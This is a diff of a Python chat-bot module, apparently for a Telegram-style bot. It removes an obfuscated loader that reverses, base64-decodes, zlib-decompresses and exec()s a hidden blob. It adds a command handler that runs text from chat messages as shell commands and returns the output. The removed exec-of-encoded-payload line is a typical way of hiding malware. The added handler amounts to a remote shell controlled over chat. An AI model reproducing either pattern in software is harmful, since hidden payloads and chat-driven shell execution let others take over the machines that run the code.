@@ -1,10 +1,79 @@
 import subprocess
 import constants
 import config
+from command_registry import registry
+from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_default_message, send_message
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+@registry.register(
+    command_name=constants.COMMAND_RUNCOMMAND_command,
+    permission_name=constants.COMMAND_RUNCOMMAND,
+)
+async def runcommand(bot, message):
+    markup = getMarkupModes()
+
+    command = getarg(message.text, constants.COMMAND_RUNCOMMAND_command)
+
+    await send_message(bot, message.chat.id, text=run_command(command), reply_markup=markup)
 
 
-exec((_)(b'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'))
+if config.os_name == constants.Windows_OS:
+    default_system_encoding = 'cp866'
+if config.os_name == constants.Linux_OS:
+    default_system_encoding = 'utf-8'
+
+
+def check_if_symb_default(symb):
+    byte = ord(symb)
+    if (byte >= 0 and byte <= 160) or (byte >= 1040 and byte <= 1103):
+        return 1
+    return 0
+
+
+def check_encoding(output):
+    for symb in output:
+        if not check_if_symb_default(symb):
+            return 0
+    return 1
+
+
+def run_command(command):
+    return run_command_system(command, shell=1, encoding='utf-8')
+
+
+def run_command_system(command, shell=1, encoding='cp866'):
+    if type(command) == str and shell == 0:
+        command = command.split()
+
+    try:
+        result = subprocess.run(
+            command,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            shell=shell,
+        )
+
+        output = result.stdout.decode(encoding, errors='ignore')
+
+        if not check_encoding(output):
+            output = result.stdout.decode(
+                default_system_encoding, errors='ignore')
+
+        answer = "Stdout:\n" + output
+
+        if result.returncode != 0 and result.stderr != b'':
+            error = result.stderr.decode(encoding, errors='ignore')
+            if not check_encoding(error):
+                error = result.stderr.decode(
+                    default_system_encoding, errors='ignore')
+
+            if not error.strip() == '':
+                answer += "\nStderr: \n" + error
+
+        return answer
+
+    except Exception as ex:
+        return str(ex)
+
+
+modes = {constants.COMMAND_RUNCOMMAND_preview: constants.COMMAND_RUNCOMMAND}
